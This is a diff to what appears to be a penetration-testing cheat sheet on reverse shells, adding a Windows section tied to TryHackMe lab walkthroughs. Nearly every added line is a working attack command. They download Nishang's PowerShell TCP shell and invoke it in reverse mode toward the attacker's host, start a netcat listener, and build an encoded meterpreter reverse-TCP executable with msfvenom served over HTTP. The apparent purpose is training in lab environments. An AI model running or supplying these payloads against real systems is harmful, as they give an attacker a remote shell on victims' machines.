@@ -8,6 +8,51 @@ Great site to just add your IP and port and gives you a list of many options for
 
 {% embed url="https://www.revshells.com/" %}
 
+## Windows
+
+### Powershell
+
+**Examples**
+
+[alfred.md](../walkthroughs/tryhackme/alfred.md "mention")
+
+**Kali**
+
+```
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 
+```
+
+Edit the file and add the following to the end of the file. This is just to make it a bit easier when we use it later.
+
+```
+Invoke-PowerShellTcp -Reverse -IPAddress $KALI -Port 4444
+```
+
+**Kali**
+
+```
+rlwrap nc -lvnp 4444
+```
+
+
+
+### EXE
+
+**Examples**
+
+[alfred.md](../walkthroughs/tryhackme/alfred.md "mention")
+
+**Kali**&#x20;
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$KALI LPORT=1337 -f exe -o shell.exe
+python2 -m SimpleHTTPServer 81
+```
+
+
+
+
+
 
 
 **Python Bind Shell**
